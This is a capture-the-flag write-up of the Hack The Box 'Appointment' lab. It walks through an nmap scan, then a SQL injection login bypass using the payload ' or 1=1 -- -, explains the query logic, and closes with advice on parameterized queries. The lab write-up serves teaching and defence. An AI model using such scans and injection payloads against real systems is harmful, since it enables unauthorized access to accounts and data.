# Appointment - HTB Write-up

> **Scope note:** This write-up documents an authorized Hack The Box lab.

## Summary

Appointment demonstrates a basic SQL injection vulnerability in a web application's authentication mechanism. By manipulating the username input, we can alter the SQL query used by the login form and bypass authentication without knowing valid credentials.

```text
Login page exposed on HTTP
        ->
Test authentication for SQL injection
        ->
Inject: ' or 1=1 -- -
        ->
Bypass login authentication
        ->
Access protected page
        ->
Retrieve flag
```

---

## Enumeration

Set target-specific values:

```bash
export TARGET=<TARGET_IP>
```

We begin by scanning the target to identify available services:

```bash
nmap -sC -sV $TARGET
```

The scan reveals the following services:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh
80/tcp open  http
```

Port `80` is hosting a web server, making the web application the primary attack surface.

---

## Web Enumeration

Navigating to the target in a browser presents a login page:

```text
http://<TARGET_IP>
```

We do not have valid credentials, so the authentication form becomes the next area to investigate.

A login form may conceptually construct a query similar to:

```sql
SELECT * FROM users
WHERE username = '<username>'
AND password = '<password>';
```

If user input is inserted directly into this query without proper sanitization or parameterized queries, the application may be vulnerable to SQL injection.

---

## SQL Injection

We test the username field using the following payload:

```text
' or 1=1 -- -
```

The password field can contain any value.

The important part of the payload is:

```text
OR 1=1
```

Because `1=1` always evaluates to true, it can change the authentication logic.

The query may conceptually become:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1 -- -'
AND password = 'anything';
```

The `-- -` comments out the remainder of the SQL query.

Effectively, the application is left evaluating:

```sql
username = '' OR 1=1
```

Since `1=1` is always true, the authentication check can be bypassed.

---

## Flag

After submitting the SQL injection payload, authentication is bypassed and access to the protected application is granted.

The flag can then be retrieved:

```text
HTB{...}
```

---

## Key Takeaways

- Always begin with service enumeration.
- Port `80` exposed the primary attack surface: a web application.
- Login forms should be tested carefully for improper input handling.
- SQL injection occurs when application input is incorporated into SQL queries insecurely.
- `' or 1=1 -- -` manipulates the query logic by introducing an always-true condition.
- `-- -` comments out the remaining SQL query.
- Parameterized queries and prepared statements help prevent SQL injection vulnerabilities.
